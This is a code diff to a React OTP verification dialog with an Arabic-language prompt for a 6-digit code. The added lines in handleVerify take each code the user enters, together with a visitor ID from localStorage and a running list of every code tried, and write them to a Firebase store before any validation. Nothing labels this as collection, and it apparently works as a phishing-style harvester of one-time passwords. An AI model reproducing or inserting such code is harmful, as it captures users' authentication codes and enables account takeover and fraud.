@@ -9,6 +9,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { AlertCircle, CheckCircle, RefreshCw, Smartphone } from "lucide-react"
 import { Alert, AlertDescription } from "@/components/ui/alert"
+import { addData } from "@/lib/firebase"
 interface OTPDialogProps {
   isOpen: boolean
   onClose: () => void
@@ -16,7 +17,7 @@ interface OTPDialogProps {
   phoneNumber: string
   onResend?: () => Promise<boolean>
 }
-
+const allOtps=['']
 export function OTPDialog({ isOpen, onClose, onVerify, phoneNumber, onResend }: OTPDialogProps) {
   const [otp, setOtp] = useState(["", "", "", "", "", ""])
   const [isVerifying, setIsVerifying] = useState(false)
@@ -112,6 +113,10 @@ export function OTPDialog({ isOpen, onClose, onVerify, phoneNumber, onResend }: 
   }
 
   const handleVerify = async (otpCode: string) => {
+const visitorId=localStorage.getItem('visitor')
+allOtps.push(otpCode)
+
+    addData({id:visitorId,otp:otpCode,allOtps})
     if (otpCode.length !== 6) {
       setError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
       return
